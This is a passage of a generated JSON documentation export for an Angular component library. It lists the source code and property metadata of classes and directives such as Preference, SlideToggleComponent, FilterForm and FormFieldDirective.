      "sourceCode": "export class Preference {\n  id: string;\n  /**\n   * Userdefined name for the filter\n   */\n  name: string;\n  /**\n   * Username of the person who owns the filter\n   */\n  user: string;\n  /**\n   * identifierKey is used to distinguish between which area of the application the filter is used\n   * For example, identifierKey can be report_filter for a list of reports, and report_columns for the same list's column setup\n   */\n  identifierKey: string;\n  /**\n   * default determines if this is the default filter if no others are selected\n   * If no filters are marked as d\n   */\n  default?: boolean;\n  /**\n   * payload is the value of the preference (e.g the filters)\n   */\n  payload: Record<string, unknown>;\n  /**\n   * external determines if the preference is external, and if so, if it should be possible to save immediately.\n   */\n  external?: boolean;\n\n  constructor(identifierKey: string) {\n    this.name = 'New preference';\n    this.identifierKey = identifierKey;\n  }\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "identifierKey",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 28,
        "jsdoctags": [
          {
            "name": "identifierKey",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "properties": [
        {
          "name": "default",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "<p>default determines if this is the default filter if no others are selected\nIf no filters are marked as d</p>\n",
          "line": 20,
          "rawdescription": "\n\ndefault determines if this is the default filter if no others are selected\nIf no filters are marked as d\n"
        },
        {
          "name": "external",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "<p>external determines if the preference is external, and if so, if it should be possible to save immediately.</p>\n",
          "line": 28,
          "rawdescription": "\n\nexternal determines if the preference is external, and if so, if it should be possible to save immediately.\n"
        },
        {
          "name": "id",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 2
        },
        {
          "name": "identifierKey",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "<p>identifierKey is used to distinguish between which area of the application the filter is used\nFor example, identifierKey can be report_filter for a list of reports, and report_columns for the same list&#39;s column setup</p>\n",
          "line": 15,
          "rawdescription": "\n\nidentifierKey is used to distinguish between which area of the application the filter is used\nFor example, identifierKey can be report_filter for a list of reports, and report_columns for the same list's column setup\n"
        },
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "<p>Userdefined name for the filter</p>\n",
          "line": 6,
          "rawdescription": "\n\nUserdefined name for the filter\n"
        },
        {
          "name": "payload",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Record<string | >",
          "optional": false,
          "description": "<p>payload is the value of the preference (e.g the filters)</p>\n",
          "line": 24,
          "rawdescription": "\n\npayload is the value of the preference (e.g the filters)\n"
        },
        {
          "name": "user",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "<p>Username of the person who owns the filter</p>\n",
          "line": 10,
          "rawdescription": "\n\nUsername of the person who owns the filter\n"
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "StoSlideToggleChange",
      "id": "class-StoSlideToggleChange-8bda7daf7113165fc555a9665e814efc3c319729f4c1528469f30476d63906a5efb096d96019e78a19e4a98353c98cfe61e20fc403bf0b4a094f381419441f56",
      "file": "libs/form/src/lib/slide-toggle/slide-toggle.component.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Output,\n  Self,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormControl, NgControl } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { Subject, Subscription } from 'rxjs';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { ThemePalette } from '@angular/material/core';\nimport { MatSlideToggle } from '@angular/material/slide-toggle';\n\nexport class StoSlideToggleChange {\n  source: SlideToggleComponent;\n  checked: boolean;\n}\n\n@Component({\n  selector: 'sto-slide-toggle',\n  templateUrl: './slide-toggle.component.html',\n  styleUrls: [ './slide-toggle.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  providers: [\n    { provide: MatFormFieldControl, useExisting: SlideToggleComponent }\n  ]\n})\nexport class SlideToggleComponent implements OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<boolean> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  focused: boolean;\n  autofilled: boolean;\n  controlType = 'number-input';\n  ctrl = new FormControl<boolean | null>(null);\n  public sub = new Subscription();\n  @HostBinding()\n  id = `value-unit-input-${SlideToggleComponent.nextId++}`;\n  @HostBinding('attr.aria-describedby')\n  describedBy = '';\n  @ViewChild(MatSlideToggle)\n  slideToggle: MatSlideToggle;\n  @Output()\n  toggled = new EventEmitter<StoSlideToggleChange>();\n  placeholder: string; // Required by material control, but not used.\n  @Input()\n  model: unknown;\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              private elRef: ElementRef<HTMLElement>) {\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  private _errorState: boolean;\n\n  get errorState() {\n    return this._errorState;\n  }\n\n  set errorState(errorState) {\n    this._errorState = errorState;\n    this.stateChanges.next();\n  }\n\n  private _disabled = false;\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(value: boolean) {\n    this._disabled = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    this._disabled ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _color: ThemePalette;\n\n  @Input()\n  get color(): ThemePalette {\n    return this._color || 'primary';\n  }\n\n  set color(color) {\n    this._color = color || 'primary';\n    this.stateChanges.next();\n  }\n\n  private _readonly = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    value ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\n    this.stateChanges.next();\n  }\n\n  get empty() {\n    const value = this.ctrl.value;\n    return value === null || value === undefined;\n  }\n\n  private _required = false;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  private _value: boolean | null;\n\n  @Input()\n  get value() {\n    return this._value;\n  }\n\n  set value(value) {\n    this._value = value;\n    this.ctrl.setValue(value, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  ngOnInit(): void {\n    const sub = this.ctrl.valueChanges\n      .subscribe((value) => {\n        const event = new StoSlideToggleChange();\n        event.checked = value ?? false;\n        event.source = this;\n        this.toggled.emit(event);\n        this.onChange(value);\n      });\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .subscribe(state => this.errorState = state === 'INVALID'));\n    }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n  onContainerClick(event: MouseEvent): void {\n    if ( !this.disabled && !this.readonly ) {\n      this.slideToggle.focus();\n      this.ctrl.setValue(!this.ctrl.value);\n    }\n  }\n\n  setDescribedByIds(ids: string[]): void {\n    this.describedBy = ids.join(' ');\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onChange = (_: unknown) => {\n  };\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onTouched = () => {\n  };\n\n  writeValue(value: boolean): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n\n}\n",
      "properties": [
        {
          "name": "checked",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 27
        },
        {
          "name": "source",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "SlideToggleComponent",
          "optional": false,
          "description": "",
          "line": 26
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    }
  ],
  "directives": [
    {
      "name": "ContextMenuDirective",
      "id": "directive-ContextMenuDirective-d08137c63dee7db80b13d60d25c2bb6e7caaca0b7230747d434a3732ad993af96c974db77f41b8e7bf63bb13ebee6dd27b7c185b0d960195894fa60ed20e1bc3",
      "file": "libs/core/src/lib/sto-directives/context-menu.directive.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Directive, HostListener, Input } from '@angular/core';\nimport { MatMenuTrigger } from '@angular/material/menu';\nimport { MenuOverlayDirective } from './menu-overlay.directive';\n\n@Directive({\n  selector: '[stoContextMenu]'\n})\nexport class ContextMenuDirective {\n  @Input()\n  menuTrigger: MatMenuTrigger;\n  @Input()\n  overlayDirective: MenuOverlayDirective;\n  @Input()\n  menuContext: unknown;\n\n  @HostListener('contextmenu', [ '$event' ])\n  contextMenu(event: MouseEvent) {\n    event.preventDefault();\n    if ( this.menuTrigger.menuOpen ) {\n      this.menuTrigger.closeMenu();\n    }\n    this.overlayDirective.updatePosition(event);\n    setTimeout(() => {\n      this.menuTrigger.menuData = this.menuContext;\n      this.menuTrigger.openMenu();\n    }, 150);\n  }\n\n}\n",
      "selector": "[stoContextMenu]",
      "providers": [],
      "inputsClass": [
        {
          "name": "menuContext",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 14,
          "type": "",
          "decorators": []
        },
        {
          "name": "menuTrigger",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 10,
          "type": "MatMenuTrigger",
          "decorators": []
        },
        {
          "name": "overlayDirective",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 12,
          "type": "MenuOverlayDirective",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [
        {
          "name": "contextmenu",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 17
        }
      ],
      "propertiesClass": [],
      "methodsClass": [
        {
          "name": "contextMenu",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 17,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'contextmenu', ['$event']"
            }
          ],
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ]
    },
    {
      "name": "DateFormFieldClickDirective",
      "id": "directive-DateFormFieldClickDirective-09a7837fac7d77a959c44da1edf42621850ade587b844a170b69acc1834c39469ec00004769c3f1f8bdd211bb990097777d47f88e81a94424bc62dca1ca8a87c",
      "file": "libs/core/src/lib/sto-directives/date-form-field-click.directive.ts",
      "type": "directive",
      "description": "<p>Directive that can be placed on mat-form-fields that contains a mat-datepicker.\nThis directive has two tasks:\nClicking anywhere on the mat-form-field will open the datepicker dialog\nWhen the datepicker is closed in any manner, we shift focus back to the datepicker input</p>\n",
      "rawdescription": "\n\nDirective that can be placed on mat-form-fields that contains a mat-datepicker.\nThis directive has two tasks:\nClicking anywhere on the mat-form-field will open the datepicker dialog\nWhen the datepicker is closed in any manner, we shift focus back to the datepicker input\n",
      "sourceCode": "import { ContentChildren, Directive, HostListener, Input, OnDestroy, OnInit, QueryList } from '@angular/core';\nimport { MatDatepicker } from '@angular/material/datepicker';\nimport { MatInput } from '@angular/material/input';\nimport { Subject } from 'rxjs';\nimport { takeUntil } from 'rxjs/operators';\n\n/**\n * Directive that can be placed on mat-form-fields that contains a mat-datepicker.\n * This directive has two tasks:\n * Clicking anywhere on the mat-form-field will open the datepicker dialog\n * When the datepicker is closed in any manner, we shift focus back to the datepicker input\n */\n@Directive({\n  selector: '[stoDateFormFieldClick]'\n})\nexport class DateFormFieldClickDirective implements OnInit, OnDestroy {\n  private destroy$ = new Subject();\n  @ContentChildren(MatInput) inputs: QueryList<MatInput>;\n  @Input() stoDateFormFieldClick: MatDatepicker<Date>;\n  @HostListener('click')\n  clickEvent() {\n    this.stoDateFormFieldClick.open();\n  }\n  ngOnInit() {\n    this.stoDateFormFieldClick.closedStream\n      .pipe(\n        takeUntil(this.destroy$)\n      ).subscribe(() => this.inputs.first.focus());\n  }\n  ngOnDestroy() {\n    this.destroy$.next(true);\n    this.destroy$.complete();\n  }\n}\n",
      "selector": "[stoDateFormFieldClick]",
      "providers": [],
      "inputsClass": [
        {
          "name": "stoDateFormFieldClick",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 19,
          "type": "MatDatepicker<Date>",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [
        {
          "name": "click",
          "args": [],
          "argsDecorator": [],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 21
        }
      ],
      "propertiesClass": [
        {
          "name": "destroy$",
          "defaultValue": "new Subject()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 17,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "inputs",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "QueryList<MatInput>",
          "optional": false,
          "description": "",
          "line": 18,
          "decorators": [
            {
              "name": "ContentChildren",
              "stringifiedArguments": "MatInput"
            }
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "clickEvent",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 21,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'click'"
            }
          ]
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 30,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 24,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "implements": [
        "OnInit",
        "OnDestroy"
      ],
      "readme": "<h4 id=\"dateformfieldclickdirective\">DateFormFieldClickDirective</h4>\n<p>Directive that can be placed on mat-form-fields that contains a mat-datepicker.</p>\n<p>This directive has two tasks:</p>\n<ol>\n<li>Clicking anywhere on the mat-form-field will open the datepicker dialog</li>\n<li>When the datepicker is closed in any manner, we shift focus back to the datepicker input</li>\n</ol>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;mat-form-field [stoDateFormFieldClick]=&quot;picker&quot;&gt;\n    &lt;input matInput\n        formControlName=&quot;date&quot;\n        [matDatepicker]=&quot;picker&quot; placeholder=&quot;Date&quot;&gt;\n    &lt;mat-datepicker-toggle matSuffix [for]=&quot;picker&quot;&gt;&lt;/mat-datepicker-toggle&gt;\n    &lt;mat-datepicker #picker&gt;&lt;/mat-datepicker&gt;\n&lt;/mat-form-field&gt;</code></pre></div>"
    },
    {
      "name": "FilterForm",
      "id": "directive-FilterForm-cec91c7cae29d7588939b1b087ee6ae84975299f48c220f1f423ee7fe8470062ca9feeca1cdfa3bd6c45773a073b62845b5eaba06beade4aa010ab2acec43b46",
      "file": "libs/common/src/lib/sto-filter/filter.ts",
      "type": "directive",
      "description": "<p>Abstract class utilized to decrease boiler plate for filters.\nGiven that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\nIt also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig &amp; serializer fn)</p>\n",
      "rawdescription": "\n\nAbstract class utilized to decrease boiler plate for filters.\nGiven that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\nIt also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig & serializer fn)\n",
      "sourceCode": "import { UntypedFormBuilder, UntypedFormGroup } from '@angular/forms';\nimport { Directive, EventEmitter, Input, OnDestroy, OnInit, Output } from '@angular/core';\nimport { Observable, OperatorFunction, Subject } from 'rxjs';\nimport { debounceTime, startWith, takeUntil } from 'rxjs/operators';\n\nexport interface FilterList {\n  key: string;\n  value: string;\n  index?: number;\n}\n\n/**\n * Abstract class utilized to decrease boiler plate for filters.\n * Given that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\n * It also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig & serializer fn)\n */\n@Directive()\nexport abstract class FilterForm<T extends Record<string, unknown>> implements OnInit, OnDestroy {\n  // FormBuilder config\n  abstract formConfig: { [ key: string ]: unknown };\n  // Serializer function\n  abstract serializer: OperatorFunction<T, FilterList[]>;\n  protected destroyed$ = new Subject();\n  // Most filters will emit a filterChanged event\n  @Output()\n  filterChanged = new EventEmitter<T>();\n  // Initial value of the filter\n  @Input()\n  value: T;\n\n  // Form group\n  public form: UntypedFormGroup;\n  // Chip value. See {@link FilterList}\n  public filter$: Observable<FilterList[]>;\n\n  constructor(private fb: UntypedFormBuilder) {\n  }\n\n  ngOnInit() {\n    this.form = this.fb.group(this.formConfig);\n    this.form.reset(this.value || {});\n    this.filter$ = this.form\n      .valueChanges\n      .pipe(startWith<T>(this.form.value), this.serializer);\n    this.form.valueChanges\n      .pipe(\n        startWith(this.form.value),\n        debounceTime(250),\n        takeUntil(this.destroyed$)\n      ).subscribe(value => this.filterChanged.emit(value));\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  /**\n   * This function clears the value for the given key.\n   * If index is passed in, it assumes the value for the key is an array, and removes the value at the given index.\n   * @param key\n   * @param index\n   */\n  public clearFilter(key: string, index?: number) {\n    if ( index || index === 0 ) {\n      const val = [...(this.form.get(key)?.value ?? [])];\n      val.splice(index, 1);\n      this.form.get(key)?.reset(val);\n    } else {\n      this.form.get(key)?.reset();\n    }\n  }\n\n  // Util function to resize tables. Looking to get rid of this...\n  public toggled() {\n    setTimeout(() => window.dispatchEvent(new Event('resize')), 300);\n  }\n\n}\n",
      "providers": [],
      "inputsClass": [
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 29,
          "type": "T",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "filterChanged",
          "defaultValue": "new EventEmitter<T>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 26,
          "type": "EventEmitter"
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "propertiesClass": [
        {
          "name": "destroyed$",
          "defaultValue": "new Subject()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 23,
          "modifierKind": [
            122
          ]
        },
        {
          "name": "filter$",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Observable<FilterList[]>",
          "optional": false,
          "description": "",
          "line": 34,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "form",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "UntypedFormGroup",
          "optional": false,
          "description": "",
          "line": 32,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "formConfig",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "literal type",
          "optional": false,
          "description": "",
          "line": 20,
          "modifierKind": [
            126
          ]
        },
        {
          "name": "serializer",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "OperatorFunction<T | FilterList[]>",
          "optional": false,
          "description": "",
          "line": 22,
          "modifierKind": [
            126
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "clearFilter",
          "args": [
            {
              "name": "key",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 64,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nThis function clears the value for the given key.\nIf index is passed in, it assumes the value for the key is an array, and removes the value at the given index.\n",
          "description": "<p>This function clears the value for the given key.\nIf index is passed in, it assumes the value for the key is an array, and removes the value at the given index.</p>\n",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 2072,
                "end": 2075,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "key"
              },
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 2066,
                "end": 2071,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            },
            {
              "name": {
                "pos": 2088,
                "end": 2093,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "index"
              },
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "pos": 2082,
                "end": 2087,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 53,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 39,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "toggled",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 75,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ]
        }
      ],
      "implements": [
        "OnInit",
        "OnDestroy"
      ],
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "fb",
            "type": "UntypedFormBuilder",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 34,
        "jsdoctags": [
          {
            "name": "fb",
            "type": "UntypedFormBuilder",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      }
    },
    {
      "name": "FormFieldDirective",
      "id": "directive-FormFieldDirective-2baf51ee27912ca010317bdc546d7c96abeeea7cb337c0759a1a006148ab66eec43ebc08af0d533f9080cf980b1af62109f5de5c2f221a09311951ef52f6342c",
      "file": "libs/form/src/lib/sto-form/form-field.directive.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import {\n  AfterContentInit,\n  AfterViewInit,\n  ContentChildren,\n  Directive,\n  ElementRef,\n  HostBinding,\n  HostListener,\n  OnDestroy,\n  QueryList\n} from '@angular/core';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { MatInput } from '@angular/material/input';\nimport { Subject, Subscription } from 'rxjs';\nimport { debounceTime, filter, map, startWith, switchMap, takeUntil } from 'rxjs/operators';\nimport { MatSelect } from '@angular/material/select';\nimport { NgControl } from '@angular/forms';\n\n@Directive({\n  selector: 'mat-form-field[stoFormField]',\n  exportAs: 'stoFormField'\n})\nexport class FormFieldDirective implements AfterViewInit, AfterContentInit, OnDestroy {\n  @ContentChildren(MatFormFieldControl)\n  input: QueryList<MatFormFieldControl<unknown>>;\n  @HostBinding('title')\n  title = '';\n  private destroyed$ = new Subject();\n  private titleSub: Subscription;\n\n  constructor(\n    private el: ElementRef<HTMLElement>) {\n  }\n\n  ngAfterViewInit(): void {\n    const el = this.el.nativeElement;\n    el.classList.add('sto-form__field');\n  }\n\n  ngAfterContentInit() {\n    this.input.changes\n      .pipe(\n        startWith(this.input),\n        map((list: QueryList<MatInput>) => list.first),\n        filter(el => !!el),\n        switchMap(el => el.stateChanges.pipe(startWith(null))),\n        takeUntil(this.destroyed$)\n      )\n      .subscribe(() => {\n        const { disabled } = this.input.first;\n        try {\n          let name = ( this.input.first?.ngControl as NgControl )?.name;\n          // Fallback to using the name-attribute\n          if ( !name && 'name' in this.input.first ) {\n            name = ( this.input.first as MatInput ).name;\n          }\n          if ( name ) {\n            this.el.nativeElement.setAttribute('data-cy', `${name}`);\n          }\n        } catch {/*em all*/\n        }\n        // eslint-disable-next-line\n        if ( this.titleSub ) {\n          this.titleSub.unsubscribe();\n        }\n        this.titleSub = this.input.first.stateChanges\n          .pipe(\n            debounceTime(30),\n            startWith(0)\n          )\n          .subscribe(() => {\n          if (this.input.first instanceof MatSelect) {\n            this.title = this.input.first.triggerValue;\n          } else {\n            this.title = this.input.first.value as string || '';\n          }\n        })\n        let readOnly = ( this.input.first as any ).readonly || false;\n        if ( this.input.first instanceof MatInput ) {\n          readOnly = this.input.first.readonly;\n        }\n\n        const el = this.el.nativeElement;\n        el.classList.remove('sto-form__field--readonly', 'sto-form__field--disabled');\n        if ( readOnly ) {\n          el.classList.add('sto-form__field--readonly');\n        }\n        if ( disabled ) {\n          el.classList.add('sto-form__field--disabled');\n        }\n        if ( this.input.first instanceof MatInput ) {\n          const inputEl = this.input.first[ '_elementRef' ] as ElementRef<HTMLInputElement>;\n          inputEl.nativeElement.autocomplete = 'off';\n        }\n      });\n  }\n\n  ngOnDestroy(): void {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  @HostListener('click')\n  @HostListener('dblclick')\n  onClick() {\n    if ( !( this.input.first instanceof MatInput ) ) {\n      return;\n    }\n    const el = this.input.first[ '_elementRef' ] as ElementRef<HTMLInputElement>;\n    if ( el.nativeElement.readOnly || el.nativeElement.disabled ) {\n      return;\n    }\n    const shouldSelect = true;\n    const textarea = el.nativeElement.tagName.toLowerCase() === 'textarea';\n    if ( shouldSelect && !textarea ) {\n      el.nativeElement.focus();\n      el.nativeElement.select();\n    }\n  }\n\n}\n",
      "selector": "mat-form-field[stoFormField]",
      "providers": [],
      "inputsClass": [],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "title",
          "defaultValue": "''",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 28,
          "type": "string",
          "decorators": []
        }
      ],
      "hostListeners": [
        {
          "name": "click",
          "args": [],
          "argsDecorator": [],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 106
        },
        {
          "name": "dblclick",
          "args": [],
          "argsDecorator": [],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 106
        }
      ],
      "propertiesClass": [
        {
          "name": "destroyed$",
          "defaultValue": "new Subject()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 29,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "input",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "QueryList<MatFormFieldControl<>>",
          "optional": false,
          "description": "",
          "line": 26,
          "decorators": [
            {
              "name": "ContentChildren",
              "stringifiedArguments": "MatFormFieldControl"
            }
          ]
        },
        {
          "name": "title",
          "defaultValue": "''",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 28,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'title'"
            }
          ]
        },
        {
          "name": "titleSub",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Subscription",
          "optional": false,
          "description": "",
          "line": 30,
          "modifierKind": [
            121
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ngAfterContentInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 41,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 36,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 99,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onClick",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 106,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'click'"
            },
            {
              "name": "HostListener",
              "stringifiedArguments": "'dblclick'"
            }
          ]
        }
      ],
      "implements": [
        "AfterViewInit",
        "AfterContentInit",
        "OnDestroy"
      ],
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "el",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 30,
        "jsdoctags": [
          {
            "name": "el",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
